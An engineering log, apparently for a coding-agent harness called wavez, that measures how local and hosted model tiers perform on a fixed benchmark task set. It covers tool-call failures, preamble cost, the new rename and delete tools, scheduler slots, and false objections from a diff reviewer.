Both halves matter. The pass line is what stops the re-running, and the
failure line is what makes the pass line credible: a run told "passed" by a
channel that never reports a failure learns nothing from it. The two
compile errors it caught (`undefined: slices`, `undefined: fmt`) each
reached the model one turn after the edit that caused them, where run 6 paid
a `go build` to find the same class of error.

The task is one package where run 6's was two, so some of the drop in turns
is the task. The shell drop is not: 20 of run 6's 29 calls were `go build`,
`go test`, `go vet`, and `gofmt` over changes the gates had already
examined, and none of run 7's are.

The reviewer objected twice and was wrong both times, once claiming a test
asserted through `Render` what it asserts directly two lines earlier. That
is the third objection-shaped false positive on the fast tier and it is
still recorded rather than blocking, which is the rule earning its keep.

## 2026-08-21, the same task twice, and what actually moved it

Runs 8 and 9 took the same task: record on a logged tool event whether the
result was an error (`internal/thread`), then count the failures per tool in
`-stats` (`internal/bench`).

| | run 8 | run 9 |
|---|---|---|
| stop | max_turns | complete |
| turns | 60 | 22 |
| tool calls | 63 | 25 |
| shell calls | 44 | 0 |
| edits | 0 | 5 |
| input tokens | 1,454,058 | 357,707 |
| elapsed | 13m5s | 7m30s |

Run 8 changed nothing at all. The task adds a key beside an existing one in a
map, and the run spent 44 shell calls mapping every consumer of that map
across `internal/cycle`, `internal/daemon`, `internal/agent`, and
`internal/tui`, almost all of them `grep -rn … | head -30` and `sed -n`. Zero
edits also means zero gate rounds, so the feedback channel that carried run 7
never fired once.

Two changes went in before run 9, and the honest reading is that only one of
them can be credited:

- Search now reports how many rows matched in full, so a capped result set is
  visibly capped. This is the one that plausibly moved it. Run 8's greps were
  establishing completeness, which a count states directly; run 9 made 8
  searches and no greps
- A run that has changed nothing for 15 turns is told to start. This did
  **not** fire in run 9, so it is still unmeasured. It was gated on the same
  edit-shaped task wording the fatal no-change rule uses, which reads the
  first line's verb alone and classified "Count the tool calls that failed"
  as a question. The nudge now fires for any run holding an editing tool,
  which is the correct test for a nudge, and the fatal rule keeps the stricter
  one

Run-to-run variance is the other candidate and cannot be ruled out from one
pair. What is not variance: run 9 used the `edits` array on four of its five
`str_replace` calls and the comma form of `list` and `read`, so the batching
added after run 7 is being used rather than merely available.

## 2026-08-21, the model screen in a PTY

The screen shipped end to end (list, registry check, install and remove with
a confirmation, per-model settings) and had never been driven against real
Ollama. Captured with VHS at 1100x700 and again at 80x24 with `NO_COLOR=1`,
against a scratch daemon on `/tmp/wz/d.sock`, with one model on disk.

What held up: the install preview is exact (`installing qwen2.5-coder:7b adds
4.4 GB to disk`, which is the registry manifest's byte size), the selected row
stays legible under `NO_COLOR` because the cursor is a `>` and a weight rather
than a color, and the table fits 80 columns.

Three defects, in the order they matter:

- **`y` was accepted before the disk delta arrived.** The two-step exists so
  the user confirms against the cost, and for the second or two before the
  daemon answers, the confirmation rendered `[y]es [n]o` over a line that
  named only the action. Pressing `y` there installed or removed against a
  question that had not been asked yet. The waiting state now says what it is
  waiting for and offers `esc` alone
- **Editing a setting hid the value it was replacing.** The input took the
  whole row, so the default the user was overwriting left the screen exactly
  when it was needed. The field is sized to its column now and the default
  stays beside it
- **The list was unbounded.** `frame` draws every body line it is given, so
  more models than rows pushed the key hints off the terminal. The list is cut
  to what fits around the cursor with a line saying how many are hidden

Two smaller ones: the `free` column never said free of what (`headroom`, the
word DESIGN.md already uses for the memory ceiling), and the confirmation
repeated `[y]es [n]o` inline where the footer already carried it.

Separately, the message shown to a terminal below 80x24 was one 99-column
sentence, so it clipped mid-word in every terminal that ever saw it. It is
three short lines now.

## 2026-08-21, the fixed task set on the fast tier

`wavez -replay <task>` runs one prompt from `_ai_/bench/timing/tasks.txt` in
a throwaway jj workspace and records what it spent, so the four tasks are now
run the same way every time and a lane is judged on the same task rather than
on two tasks of similar size.

First pass, `qwen3:8b`, 40 turns and a 10 minute wall clock:

| task | stop | turns |
|---|---|---|
| q1 answer a question | complete | 3 |
| e1 one line in README | malformed_tool_call | 4 |
| e2 add a method and a test | malformed_tool_call | 2 |
| e3 rename across a package | complete | 16 |

The ordering is the finding. The hardest task in the set finished and the
easiest died, so what the fast tier lost was never the reasoning. Each failure
named itself in the transcript:

- **A malformed call ended the thread outright.** e2 died on turn two from one
  invalid-JSON emission. Nothing had run, so sending the call again was all it
  had to do, and the loop offered no way to. It now gets the one escalation an
  identical repeat gets, and ends the thread on a second. e1 went from dead at
  turn 4 to complete at turn 6, and e2 from dead to complete
- **A failed anchor reported the lines that already matched.** e2's next
  attempt sent a long `old_string` to insert a method after `Free`, missed by
  one line of trailing context, and got back the closest match truncated at 12
  lines with "9 more lines not shown", which elided the line that differed. It
  guessed twice more and died stagnant. The error now names the one line that
  parts, sent against source
- **An anchor matching no line at all said only "not found".** e3 closed a
  JSON string with a typographic quote, so the anchor was right except for
  three trailing characters, matched nothing line-wise, and got no help. The
  report now comes from the longest prefix of the anchor that occurs in the
  file, which points straight at the quote
- **A batch of edits with no path was refused as "outside the project root".**
  That describes a containment problem the run did not have. It says the path
  is missing now

With those in, the same set runs 4/4 complete with every check passing, and
that sentence is worth less than it looks: see the tier mix below, which says
who actually did the work.

Two things the counters could not say before this session:

- **`complete` is the loop's verdict on itself.** q1 finished by naming the
  right file and inventing a count of rule kinds. Every task carries checks
  now (`path:substring`, `answer:substring`, `build:` or `test:` for a go
  command, `!` to invert), evaluated in the workspace before it is removed.
  q1 was reworded to ask something checkable
- **Substrings are not enough either.** e3 renamed the function and its
  callers in one file, passed both substring checks, and left
  `internal/daemon/manager.go` calling the old name. The gate caught it and
  the oracle did not, so an edit task now compiles or tests in its check list

Variance on this tier is large and has to be read into every pair: e1 ran 5
turns and 17k input tokens on one pass and 24 turns and 163k on another with
nothing between them that touches its path. A pair is evidence for a state
change (dead to complete) and weak evidence for a percentage.

## 2026-08-21, who actually ran the fixed task set

The four runs above were recorded as the fast tier and reported as the fast
tier finishing every task. The records already carried `tier_turns` and I read
the pin instead, which is the number the router explicitly does not promise: a
pin is a floor rather than a cage, so a thread whose tier keeps failing moves
up and finishes somewhere else.

What the same four records say when the mix is read:

| task | asked | tiers | stop | checks |
|---|---|---|---|---|
| q1 | fast | 2 fast | complete | 2/2 |
| e1 | fast | 1 fast, 4 balanced | complete | 1/1 |
| e2 | fast | 4 fast, 7 balanced | complete | 3/3 |
| e3 | fast | 6 fast, 12 balanced | complete | 3/3 |

Only q1 ran on the fast tier. Every edit task escalated to the hosted model
inside six turns and finished there, so the fast tier's contribution to the
three edit tasks was the turns it spent before giving up. `-replay-report` now
carries a `tiers` column and names any run that finished above its pin, so the
same mistake costs a glance rather than a session.

The failure that escalates is mechanical, and it is the same one every time.
Across all six e3 runs the fast tier spent exactly six
turns, and turns three, five, and six were byte-identical:

```
{"path": "internal/daemon/thread.go", "old_string": "func firstDir(dirs []string) string {\", \"new_string\": \"func primaryDir(dirs []string) string {\"}, {"
```

It escaped the closing quote of `old_string` and swallowed the rest of the
object into the string, three times, then stagnation escalated. `qwen3:8b`
knew the rename, found the symbol, and could not emit a JSON object with code
inside it.

That is the argument for Modifiers rather than a bigger fast tier. A rename
sent as `{"kind":"rename","symbol":"firstDir","to":"primaryDir"}` has no
embedded source, so the emission that fails here has nothing to fail at. It
also bounds the remit the set can currently prove: read-only questions hold on
`qwen3:8b`, and every task that has to emit code inside JSON has escalated.

## 2026-08-21, the harder tasks, and a critique that made it worse

Three tasks joined the fixed set: `h1` asks a question whose answer is only
findable by behavior, `h2` asks for a behavior change with a test, and `h3`
renames an exported function across packages. First pass, `fast` pin:

| task | tiers | stop | checks |
|---|---|---|---|
| h1 | 1 fast | complete | 0/3 |
| h3 | 7 fast, 5 balanced, 7 deep | deadline at 3m | 6/6 |

`h3` is the task the set was missing. It escalated the whole way to the deep
tier, took nineteen turns, and passed every check including `go build ./...`
and two `go test` patterns, so the set now has something that is hard for a
reason other than emission.

`h1` is worse than a failure. `qwen3:8b` answered in one turn having called no
tool, naming `main.go` and `handleRequest`, neither of which exists, and the
loop recorded `complete`. Only the oracle caught it. A run that fabricates and
is believed is the failure mode that costs the most, because nothing downstream
knows to doubt it.

The obvious fix does not work. A critique after a no-tool answer, once, before
the run may complete, measured as a pair on `h1`:

| lane | turns | tool calls | checks |
|---|---|---|---|
| ground-off | 1 | 0 | 0/3 |
| ground-on | 2 | 0 | 0/3 |

The second answer opened "The code it rests on is in `main.go`", which is the
critique's own phrasing wrapped around the same invention. Asking a model to
say what it read makes the fabrication cite itself. The code was written behind
a flag that defaulted off with that pair named as its removal condition, and
the pair removed it.

What is left is the deterministic half. Refusing `complete` outright on a run
that called no tool would have failed `h1` loudly, and it would also stop a
question that genuinely needs no lookup, so it is a change to the loop's
contract rather than a bound on a failure. It waits on the task-shape signal
the risk list already names, now with a second case: the list says a run that
asked for a change and never reached an edit tool still completes, and `h1`
says the same holds for a run that asked a question and never reached a read.


## 2026-08-21, what the preamble is made of

`wavez -preamble` accounts for the fixed prefix by section, because the prefix
is the one cost that scales with turns rather than with work and every
proposal to trim it so far has been an argument from memory. On this project:

| kind | bytes | ~tokens | share |
|---|---|---|---|
| tool schemas | 4,307 | 1,076 | 41% |
| project context | 3,475 | 868 | 33% |
| tool descriptions | 2,085 | 521 | 20% |
| system rules | 666 | 166 | 6% |
| total | 10,533 | 2,633 | |

The fast tier is admitted against an 8,192-token window less a 1,024-token
reply reserve, so the prefix occupies 37% of what a fast turn can use before
the task is stated. Against the 12k window this laptop actually serves it is
24%.

Two single sections dominate: `AGENTS.md#Verify before you report` at 2,296
bytes and `str_replace`'s schema at 1,270.

The size is the smaller half of the finding. `Verify before you report` is a
runbook written for a human, or for an agent with a shell and a git remote: it
names five CI jobs to reproduce, `hk`, `actionlint`, `copier`, and the
release-asset check. Wavez's model has none of that remit, and the harness's
own system rules already tell it that formatting is fixed for it and that
gates decide when work is done. Across the 87 thread logs this project has
accumulated, 40 of 261 shell calls (15%, 24 KB of results) run exactly what
the gates run: `mise run ci`, `golangci-lint`, `gofmt`, `go vet`. Two of them
go on to `git add -A && git commit`. The context section is not merely paid
for on every turn, it buys turns that undo the system rules.

Tool use over the same logs, which is what the schema bytes should be judged
against:

| tool | calls | share | errors |
|---|---|---|---|
| read | 268 | 31% | 1 |
| shell | 261 | 31% | 2 |
| str_replace | 151 | 18% | 41 |
| search | 121 | 14% | 0 |
| list | 25 | 3% | 0 |
| context | 17 | 2% | 0 |
| write | 11 | 1% | 0 |
| question | 1 | 0.1% | 0 |

`str_replace` fails on 27% of its calls, more than every other tool combined
by two orders of magnitude, and it is also the single largest schema. The
1,623 bytes it costs every turn are not buying reliability. `question` costs
431 bytes a turn and has been called once in 855 calls.

## 2026-08-21, a VCS hint the model tried to follow

An `e2` run passed all three checks at turn 16 and then spent the rest of its
three minutes on this:

```
jj workspace update-stale
pwd && ls -ld .git .git/objects && jj root 2>&1 | head -5
env | grep -i -E 'jj|git' ; ls -a | head -20
cat .jj/repo/store/git/target 2>/dev/null; echo ---; ls .jj
```

Every shell call the run made was VCS archaeology, and none of it was the
task. What sent it there was a gate message:

```
fail-to-pass gate: diffing the working copy of /tmp/wavez-replay-...:
jj diff --from @- --to @ --git: exit status 1: Error: The working copy is
stale (not updated since operation d6bbc06e8aab).
Hint: Run `jj workspace update-stale` to update it.
```

The model did what the hint said. It could not have worked: the hint is
addressed to whoever owns the repository, the shell runs in a sandbox, and
the staleness was mine. Editing a file in the main workspace and running any
`jj` command there rewrites the commit a replay workspace sits on, and every
replay I ran while working in the repo went stale that way.

Two fixes, one in each half. `runJJ` now recovers from a stale working copy
by running the update jj itself prescribes and retrying once, so the error
never leaves `internal/vcs`. `internal/vcs/jj_test.go` reproduces the
staleness with an edit plus a `jj status` in the first workspace, which is
the trigger, and the test fails without the recovery.

The other half is a rule the harness does not yet hold: an infrastructure
failure is not a gate failure. `GateVerifier.runStep` turns any error a gate
returns into a failing result whose frames are the error text, which is right
for a missing toolchain binary and wrong for a VCS error the model cannot
reach. Nothing downstream distinguishes them.

It also means every wall-clock number this harness has produced while I was
working in the repo is suspect for a second reason, after the derived-state
one.

## 2026-08-21, what the harness can and cannot resolve

Before reading any A/B on the fixed set, this is the spread of repeated runs
of the same task, counting only runs that took a turn:

| task | runs | mean turns | sd | min | max |
|---|---|---|---|---|---|
| e1 | 5 | 11.8 | 8.4 | 4 | 24 |
| e2 | 8 | 8.8 | 3.5 | 2 | 13 |
| e3 | 6 | 17.7 | 8.5 | 7 | 35 |
| h2 | 4 | 8.2 | 1.6 | 7 | 11 |
| q1 | 4 | 2.5 | 0.5 | 2 | 3 |

The coefficient of variation runs 40-70% on every editing task. Two runs of
`e2` on the same lane an hour apart gave 8 turns with 1 of 3 checks and 12
turns with 3 of 3. At that spread, resolving a 30% change in turns would take
tens of runs per arm at three minutes each, so any pair I have reported as a
lane's result, in this file or in DESIGN, bounds nothing below roughly a
factor of two.

What survives is a metric that does not depend on the model's path through
the task. Input tokens per turn is one: the preamble is a constant of the
build, and `wavez -preamble` reports it exactly. Counting one named behavior
across many runs is another, which is how the gate-duplicating shell calls
were counted. Turns and check rate stay useful for catching a regression that
is large, and useless for tuning.

Across all 32 recorded replay runs, the preamble is a median 55% of a run's
input tokens (range 23-92%, and above 45% in all but three runs). The three
low outliers are the runs that read the most: a long file pushes the share
down without making the preamble smaller. Dropping the CI runbook and adding
one system bullet to replace it takes the preamble from 2,633 to 2,112
tokens, so roughly a tenth of every input token the harness spends.

The money it saves is smaller than that, because 80.5% of all input tokens
across those runs were served from cache: the preamble is the most cacheable
thing in the request and both llama-server and the hosted tier already hit on
it. What it buys instead is window. A fast turn is admitted against 8,192
tokens less a 1,024-token reply reserve, and 521 tokens is 7% of that.

The rules themselves hold up where they are checkable. Across 175 edit calls
in the thread logs, 5 touched an import block that already existed (3%), and
2 added a `//nolint`, both of them the `wrapcheck` form this repo writes by
convention. `Repeating a failed call unchanged ends the task` is enforced by
the loop rather than trusted to the model. So the system rules are earning
their 666 bytes; it is the borrowed project context that is not.

## 2026-08-21, where the tool payload actually goes

Result bytes across the 87 thread logs, which is what any further payload
work should be aimed at:

| tool | result bytes | share | avg per call |
|---|---|---|---|
| read | 919,884 | 67% | 3,273 |
| shell | 202,289 | 15% | 763 |
| search | 147,522 | 11% | 1,199 |
| context | 48,499 | 4% | 2,309 |
| list | 35,562 | 3% | 1,317 |
| str_replace | 16,193 | 1% | 98 |

`read` is two thirds of it, and a third of that is waste this harness can
identify without a model. Of 281 reads, 94 re-read a path the same thread had
already read with no edit to it in between: 336 KB, 36.5% of all read bytes,
roughly 84k tokens. `internal/bench` already counts this (`repeat reads 16 of
32 (26,581 bytes)` on the read-heaviest thread, 45% there), so the
instrumentation has been reporting the problem for as long as it has existed.

That looked like the next payload lever, and it is not. A tool result is
charged again on every turn that follows it, so what a payload costs is its
bytes times the turns left, and a re-read happens late in a run by its
nature. Charging every duplicate in the logs at the turn it appeared and
summing over the remaining turns gives 10.6k tokens of 1.6M on the threads
that have any duplicate at all: 0.7% of input tokens. Doing it line by line
rather than byte-exact, so a second read of an overlapping range counts too,
gives 72.7k of 8.4M across every thread: 0.9%.

The share of a component says nothing about the saving until it is weighted
by how many requests still carry it. The preamble is the opposite case and
that is the whole reason it matters: it is carried by every request, so its
55% median share is its cumulative share too.

The dedupe ships regardless, because it costs nothing. `thread.DedupeToolReads`
already existed and ran only when `maybeCompact` crossed 75% of the routed
tier's budget, which a hosted turn never does. It now runs when the request is
assembled: the first copy is kept, later copies become a reference to the turn
that produced it, and because a result deduped on one turn is deduped
identically on the next, the provider's cached prefix does not move.

## 2026-08-21, the context trim, measured as far as it can be

One round of each condition on two tasks, `full` carrying
`AGENTS.md#Verify before you report` and `trim` dropping it for one system
bullet that forbids running the project's checks or version control:

| task | lane | stop | turns | input/turn | checks |
|---|---|---|---|---|---|
| e2 | full | complete | 12 | 4,994 | 3/3 |
| e2 | trim | deadline | 10 | 4,585 | 1/3 |
| h2 | full | deadline | 10 | 4,667 | 1/2 |
| h2 | trim | stagnant | 7 | 2,868 | 1/2 |

Read this for what it is. The variance section above says a pair on this
harness resolves nothing below a factor of two, and `e2` has produced 1 of 3
and 3 of 3 on the same lane an hour apart. What the table shows is the
absence of a large regression, not a win.

The input-per-turn column is the only part that is close to deterministic,
and it moved the way the arithmetic says: `e2` dropped 409 tokens a turn
against a 521-token preamble cut, the rest being content that varies.

None of the four runs made a single shell call, so the behavior the trim is
aimed at was not exercised. That behavior is real and it is confined to
headless runs: all 40 gate-duplicating shell calls in the logs come from
`p-*` threads across 13 of them, and none from a daemon thread. Whatever
made today's four runs quiet, the earlier ones were not.

## 2026-08-21, three threads and one slot

The scheduler only ever held a turn against a gate run. Turn against turn was
unbounded, so `fleet-probe` opening three threads across two roots got all
three admitted at once, all three reading `working`, against a llama-server
started with `-np 1`. What actually happened is in the logs: each thread got
exactly one turn, landing at 13:19:24, 13:19:26, and 13:19:27, about 100
seconds after the prompts went in, and then all three hit the three-minute
deadline having changed nothing. The other two turns were queued inside
llama-server, where the scheduler cannot see them and the schedule view
cannot say so.

`sched.WithLocalSlots(runtime.ServedSlots)` bounds concurrent local turns by
the `-np` the server was started with. The same probe now renders:

```
[15:23:23] phase=edit model=qwen3:8b free=26% headroom=25%
  93b9d2128445f9b4       working
  2fffb4f70988cefc       held for the local model, 1 of 1 slot(s) busy
  ec4d3bad48df85a5       held for the local model, 1 of 1 slot(s) busy
```

Each thread ran to its end and the next was admitted, three lanes draining in
order. Two things moved. Decode ran at a median 23 tokens/s against 16.7 when
three turns shared the slot, about 40% faster, because the server was serving
one request rather than interleaving three. And each thread got 3, 3, and 2
turns in the window where the contended run got one apiece, since a queued
thread now waits before its wall-clock deadline starts rather than inside it.

Free memory sat at 13-27% against a 25% headroom throughout, and the memory
rule held nothing back either way. The rival that mattered was never a gate
run.

Bounding it at the run was wrong in a way the probe could not show, because
nothing in the probe escalates for long: a run pinned `fast` that escalates
would have held the one slot this laptop has through hosted turns it was not
using it for, starving every other local thread. So the two bounds are now
separate. `AdmitTurn` is held for a whole run and competes with gate runs for
memory. `AdmitSlot` is held around one request, competes with other requests
for the server, and is taken in the loop, which is the only place that knows
a turn's tier. A run that escalates gives its slot back and keeps its
admission.

The deadline shifts by whatever a turn waited for a slot. A wall-clock bound
that counts queueing measures the queue, and that is exactly how three
threads came to fail at three minutes having taken one turn each.

Waking every waiter to race for the freed slot is not enough either. On the
first per-turn run, two threads took 3 and 2 turns while the third took none
in two minutes, because nothing ordered the queue. The slot is now handed to
whoever has waited longest, and a caller that gives up while queued gives
back a slot it was handed on the way out.

The trim shipped with the bullet narrowed. "Never run this project's own
checks" would also have stopped a run from executing one failing test to
watch it fail, which is how a model finds out what is wrong. It now names
what the harness owns (`mise`, `hk`, `golangci-lint`, `gofmt`, `git`, `jj`)
and says a single test is not that. The preamble is 2,117 tokens against
2,633, and the project's context list is one entry: the Go conventions the
model is actually writing code against.

## 2026-08-21, one call instead of nineteen turns

`h3` asks for an exported function to be renamed across packages, tests and
comments included. It is the task the fast tier was worst at, and the reason
was never the reasoning: `qwen3:8b` finds the symbol and then cannot emit the
edit, escaping the closing quote of `old_string` and swallowing the rest of
the JSON object into the string, identically, six runs out of six.

A rename stated as two identifiers has no source to escape. `rename` sends
`{"symbol": "Read", "to": "ReadLog", "path": "internal/bench"}` to gopls,
which resolves the symbol through type information and answers with every
occurrence. Same task, same `fast` pin, only the tool surface different:

| lane | tiers | stop | checks | turns | tool calls | input tokens | elapsed |
|---|---|---|---|---|---|---|---|
| str_replace | 7f 5b 7d | deadline | 6/6 | 19 | 19 | 154,064 | 3m29s |
| rename | 3f | complete | 6/6 | 3 | 1 | 7,934 | 1m3s |

Six times fewer turns, nineteen times fewer input tokens, and it never left
the free local model: the earlier run spent 12 of its 19 turns above the tier
it asked for, and this one spent none. The whole edit was the first tool call
of the first turn, seven occurrences across three files including the caller
in another package and the test.

Two things this does not say. It is one run of one task, and the variance
section applies to everything except the token count, which is arithmetic. And
the check that would catch a rename that compiled but was wrong is the same
`build:./...` both lanes passed, so what is being compared is cost, not
correctness.

The first dogfood run failed for a reason worth keeping: the model sent
`path: "internal/bench"`, the package rather than the file, and the tool
refused it. A model narrowing a rename writes the package. `path` now takes
either, and a path that narrows to nothing says where the symbol actually is
rather than only that it is not there.

## 2026-08-21, the reviewer inventing work

Of the three turns, two went to this:

```
A review of your diff against the task objects: The diff does not rename the
exported function Read in internal/bench/stats.go to ReadLog. It only renames
the function in internal/bench/stats.go, but the function is not exported.
```

The diff did exactly what was asked, the gates passed, and the objection
contradicts itself inside one sentence. `GateVerifier` had already returned
green; this is the diff reviewer, which `internal/app/reviewer.go` pins to
`router.ChoiceFast`. So the fast tier, having been taken off the hook for the
edit, is still on the hook for judging one, and it is worse at that than at
the emission it was failing before.

Two review objections on a correct diff is the false-positive cost the tier
question was asked about in the first place: work manufactured for a model
that then has to argue with it.

## 2026-08-21, what the edits in the logs actually are

Every `str_replace` pair this project's threads have ever sent, classified by
what the edit does:

| shape | calls | share | bytes | share |
|---|---|---|---|---|
| rewrite a block | 65 | 35% | 31,666 | 49% |
| identifier rename | 50 | 27% | 7,889 | 12% |
| delete | 38 | 21% | 6,252 | 10% |
| append after existing code | 23 | 12% | 12,292 | 19% |
| insert before existing code | 9 | 5% | 5,976 | 9% |

A quarter of every edit ever made here was a rename done the hard way, which
is the retrospective case for the tool the `h3` measurement makes
prospectively.

What comes next is not what the byte column first suggests, and the reason is
the same mistake as the read-dedup one earlier today: a component's share is
not the saving.

An insert or append looks like the big one at 28% of edit bytes. Measured
properly, the 32 anchored inserts spend 18,268 bytes, of which 6,246 are the
anchor sent twice (once as `old_string`, once repeated inside `new_string`
because a replacement replaces everything) and 12,022 are content that has to
be sent whatever the tool. An anchor-plus-text form saves the repeat, which is
9.7% of all edit bytes. Real, and a third of what the table implies.

More to the point, an insert still asks the model to emit new source inside a
JSON string, which is the thing the fast tier cannot do. It trims a cost; it
does not move work down a tier.

A delete does. It is 21% of the calls and needs no emitted source at all, only
the name of what goes, so it has `rename`'s property rather than
`str_replace`'s. That makes delete the next Modifier and insert the one after,
on the criterion that actually decided `h3`.

What is left after both is the block rewrite, 35% of calls and half the bytes,
which is what `str_replace` is actually for.

## 2026-08-21, the same story on e3, with seven runs of history

`e3` is `Rename the unexported function firstDir in internal/daemon/thread.go
to primaryDir`, the task whose failure this file documents six times: six fast
turns, the same malformed `old_string` byte for byte, then escalation. Every
recorded run before today shows it, and the `6f` in the tiers column is that
failure counted:

| lane | tiers | stop | checks | turns | input tokens | elapsed |
|---|---|---|---|---|---|---|
| fast-remit | 6f 7b 3d | complete | - | 16 | 84,183 | 4m36s |
| fast-retry | 6f 8b | complete | - | 14 | 59,472 | 3m23s |
| checked | 6f 1b | stagnant | 0/2 | 7 | 33,771 | 43s |
| anchor-prefix | 6f 29b | deadline | 2/2 | 35 | 396,030 | 10m17s |
| anchor-prefix | 6f 10b | verify_failed | 2/2 | 16 | 60,528 | 3m28s |
| oracle | 6f 12b | complete | 3/3 | 18 | 89,937 | 3m54s |
| **rename** | **2f** | **complete** | **3/3** | **2** | **5,144** | **41s** |

Against the best previous finish, nine times fewer turns, seventeen times
fewer input tokens, and five times faster. Against the worst, seventy-seven
times fewer tokens. The six-fast-turns signature is simply gone, because
there is no longer a way for the model to fail at it: the whole edit is
`{"symbol": "firstDir", "to": "primaryDir", "path": "internal/daemon/thread.go"}`.

Two tasks now tell this story rather than one, and `e3` is one of the original
four, so it is measured against a long history rather than a single pair. What
neither says is anything about correctness: both lanes pass the same checks,
so what is compared is cost.

## 2026-08-21, the whole set on one build

Every task, one run, `fast` pin, on `a7af0d8`, against the median of every
earlier recorded run of the same task. That build carries the shell
reduction, workspace seeding, request-assembly dedupe, the stale-copy fix,
the context trim, the slot bound, and `rename`. It predates `delete`, the
several-symbols form, the widening fixes, and the reviewer's move to the
balanced tier, so read it as the state at that commit rather than as the
state of the tree:

| task | prior median turns | today | prior median input | today |
|---|---|---|---|---|
| q1 | 3 | 2 | 12,068 | 6,305 |
| e1 | 6 | 5 | 23,126 | 16,114 |
| e2 | 11 | 7 | 59,935 | 28,024 |
| e3 | 16 | 2 | 84,183 | 5,144 |
| h1 | 1 | 1 | 2,872 | 2,551 |
| h2 | 8 | 4 | 41,197 | 13,781 |
| h3 | 6 | 6 | 18,615 | 17,026 |

Nothing regressed, and the set as a whole went from 51 turns and 241,996
input tokens to 27 turns and 88,945. Read the totals with the variance
section in mind: the turn column is noisy per task, the medians mix lanes
built from different code, and `h3`'s prior median is dragged down by its own
two rename runs earlier today (against its `str_replace` baseline it is 19
turns and 154,064 tokens). What is not noisy is `e3`, where the mechanism is
known and the six-fast-turn signature is simply absent.

`q1` came back 1 of 2 where it had been 2 of 2, the model answering
`guard.go` rather than `rules.go` after a single search. Two re-runs on the
same build gave 1 of 2 and then 2 of 2, so it flips: variance on a two-turn
task, not a regression from anything shipped today.

`h1` is unchanged and still answers in one turn having called nothing, which
is the hole the risk list already names.

## 2026-08-21, delete, and two fixes that made it worse first

`delete` removes a whole declaration by name, doc comment and all. `h4` was
added to exercise it: `internal/edit`'s `ApplyToFile` is reachable from no
main and covered by six test functions, so the task is one deletion a
Modifier can do plus six it has to find.

The first half worked immediately and every time: one call, 36 lines, the
neighbouring `writeAtomic` untouched. The second half is where four runs
went, and the trail is worth keeping because two of my fixes made it worse
before one made it better.

| lane | what changed | turns | tiers | checks |
|---|---|---|---|---|
| first | delete, one symbol per call | 19 | 4f 6b 9d | 4/5 |
| widened | widen a lookup that returns nothing | 13 | 13f | 4/5 |
| named-gate | widen until any result is plausibly named | 3 | 3f | 4/5 |
| many | delete takes several symbols | 9 | 9f | 4/5 |
| query-gate | judge plausibility against the widened query | 22 | 12f 10b | 3/5 |
| guarded | refuse to delete what is still used | 7 | 2f 5b | 2/5 |
| together | say the several-symbols form in the refusal | 3 | 3f | 4/5 |
| named-uses | name the declarations holding the uses | 4 | 4f | **5/5** |

Eight runs to get from 19 turns escalating to the deep tier and failing, to 4
turns entirely on the local model with every check passing, including the two
that prove it left `writeAtomic` and `ApplyAllToFile` alone. Read the middle
of that table as what it is: several of those lanes are one run each, the
variance section applies, and three of the changes made things worse before
one made them better.

The model kept guessing `ApplyToFileTest` for a test really called
`TestApplyToFile`. Widening the lookup when it finds nothing does not help,
because the text index answers a nonsense symbol name with whatever files
mention its letters, so it never finds nothing. Gating on a plausibly-named
result fixed that and then failed differently: plausibility was judged against
the name originally asked for, and `TestApplyToFile` is nothing like
`ApplyToFileTest`, so the widening ran off the end and suggested an unrelated
`apply` in `internal/daemon` while the caller had said `internal/edit`. A
suggestion pointing out of the named package is worse than no suggestion,
because a run that follows it has been sent away from the file it named.

Judged against the query that fetched the results, `ApplyToFile` returns
`TestApplyToFile`, the refusal says so, and the model used it on the next
call without a search.

The other thing `h4` surfaced is the cost side of a cheap deletion. Twice the
model deleted `ApplyAllToFile`, which the task explicitly says to leave alone
and which `str_replace` depends on, broke the build, and spent the rest of
the run failing to put it back (22 turns, 3 of 5). A Modifier makes a
destructive act one short call, so the blast radius per misread task goes up
exactly as the token cost comes down. Waiting for the build gate to catch it
is not enough, because by then the run is arguing with a compiler instead of
doing the task.

So `delete` now asks the language server what still uses a declaration and
refuses when anything outside the same call does. Uses inside the other
symbols the call is removing do not count, since deleting a function together
with its tests is the ordinary case, and the ranges are taken before anything
moves because by the time the check runs those declarations are gone.

The refusal then took three tries to become useful, and the same lesson each
time: the message has to carry what the next call needs.

- Naming only the locations (`apply_test.go:23`) left the model to map lines
  to declarations, and it answered by naming the two symbols the task had
  told it to keep, then stopped
- Naming the multi-symbol form without the names got the shape right and the
  arguments wrong for the same reason
- Naming the declarations (`TestApplyToFile (apply_test.go:23)`) let it copy
  them straight out: one refusal, one wider refusal as the list ran past the
  three it shows, then a single call removing all seven declarations

That is the third time today a measurement has pointed at the same thing. A
refusal is not a diagnosis, it is the input to the next call, and it is worth
as much care as the tool's own output.

The passing run still ended on its deadline rather than completing. The task
was done in three tool calls; what filled the remaining time was a reviewer
objection and an `lsp` diagnostic about an unused import the format gate had
already removed. Both are false-positive work, and between them they are now
the largest remaining cost on a task the Modifiers finish in three calls.

## 2026-08-21, the reviewer is wrong in one direction

Every objection the diff reviewer has ever raised in this project, seven of
them across 87 thread logs. Four are plausible and unverified. Three are
provably wrong, and all three are against diffs a Modifier produced:

- `h3`, twice, in separate runs and in the same words: "The diff does not
  rename the exported function Read in internal/bench/stats.go to ReadLog. It
  only renames the function in internal/bench/stats.go, but the function is
  not exported." Both runs passed 6 of 6 checks
- `h4`: "it also deletes the writeAtomic function, which the task said to
  leave alone". That run passed 5 of 5, including the check that exists to
  prove `writeAtomic` survived

Two of the three are byte-identical across separate runs, which is the same
signature as the malformed `str_replace` emission: a deterministic failure
mode rather than sampling. A mechanical diff is many hunks and no new logic,
and the small model loses the thread of it.

This is the false-positive cost the tier question was asked about, and it now
has a direction. The fast tier was taken off the hook for emitting an edit
and left on the hook for judging one, which it is worse at. `reviewer.go`
now floors the review at the balanced tier, and `h3` is the measurement:

| reviewer tier | stop | turns | tool calls | input tokens | objections | checks |
|---|---|---|---|---|---|---|
| fast | complete | 3 | 1 | 7,934 | 2 | 6/6 |
| fast | complete | 6 | 3 | 17,026 | 2 | 6/6 |
| balanced | complete | 2 | 1 | 5,465 | 0 | 6/6 |

`h4` is the cleaner pair, because the two runs are otherwise the same run:
4 turns, 3 tool calls, and 11,679 input tokens in both, identical to the
byte, since the local turns are near-deterministic and only the reviewer
differed.

| reviewer tier | stop | turns | objections | checks |
|---|---|---|---|---|
| fast | deadline | 4 | 1 | 5/5 |
| balanced | complete | 4 | 0 | 5/5 |

One false objection was the whole difference between a run that finished and
a run that spent its remaining two minutes arguing about a `writeAtomic` it
had not touched.

